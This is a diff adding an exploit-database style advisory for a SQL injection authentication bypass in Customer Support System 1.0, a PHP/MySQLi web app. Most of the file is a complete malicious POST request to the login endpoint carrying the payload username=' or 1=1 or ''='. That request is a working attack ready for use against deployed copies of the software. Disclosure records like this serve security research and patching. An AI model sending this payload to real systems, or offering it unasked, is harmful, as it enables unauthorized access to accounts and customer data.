@@ -1,0 +1,30 @@
+# Title: Customer Support System 1.0 - 'username' Authentication Bypass
+# Date: 2020-11-11
+# Exploit Author: Ahmed Abbas
+# Vendor Homepage: https://www.sourcecodester.com/php/14587/customer-support-system-using-phpmysqli-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14587&title=Customer+Support+System+using+PHP%2FMySQLi+with+Source+Code
+# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
+
+
+# Description :  Authentication Bypass
+# Vulnerability Details:
+[+] A SQL injection vulnerability in Customer Support System 1.0  allows remote unauthenticated attackers to bypass the authentication process via username and password parameters.
+ 
+
+# Malicious POST Request to https://TARGET
+POST /customer_support/ajax.php?action=login HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 62
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/customer_support/login.php
+Cookie: PHPSESSID=gbattc1r1riap25kr5k2k1ureo
+
+username=' or 1=1 or ''='&password=password&type=1
